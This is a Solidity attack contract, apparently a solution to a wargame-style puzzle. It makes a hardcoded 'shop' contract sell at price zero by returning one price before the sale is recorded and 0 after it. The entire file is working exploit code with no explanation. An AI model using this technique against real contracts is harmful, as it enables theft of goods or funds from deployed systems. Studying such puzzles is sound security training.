// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Shoplifter {
    address shop = address(0x8eee5764f1b261292e6aA0188417De799E2EEeaa);

    function price() external returns (uint256) {
        bytes memory payload_isSold = abi.encodeWithSignature("isSold()");
        (, bytes memory returnData_isSold) = shop.call(payload_isSold);

        bool isSold = abi.decode(returnData_isSold, (bool));

        if (!isSold) {
            bytes memory payload_price = abi.encodeWithSignature("price()");
            (, bytes memory returnData_price) = shop.call(payload_price);

            uint256 shopPrice = abi.decode(returnData_price, (uint256));

            return shopPrice;
        } else {
            return 0;
        }
    }

    function shoplift() public {
        bytes memory payload = abi.encodeWithSignature("buy()");
        (bool success, ) = shop.call(payload);

        require(success, "Failed to shoplift!");
    }
}
